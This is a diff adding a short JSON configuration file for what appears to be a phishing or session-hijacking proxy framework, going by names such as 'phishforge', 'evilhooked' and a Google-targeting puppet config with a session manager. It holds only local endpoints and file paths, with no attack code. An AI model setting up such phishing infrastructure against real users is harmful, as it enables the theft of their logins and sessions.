@@ -1,0 +1,11 @@
+{
+  "puppet_default_upstream": "http://127.0.0.1:1000",
+  "phishforge_puppet_mod": true,
+  "puppet_sidecar_node": "node",
+  "session_manager_enabled": true,
+  "session_manager_url": "http://127.0.0.1:3000/api/v1/session/process",
+  "session_manager_target_url": "https://www.google.com/",
+  "puppet_sidecar_config": "evilhooked/puppet-google.json",
+  "puppet_bridge_entry": "puppet-bridge/src/index.js",
+  "evilhooked_root": "."
+}
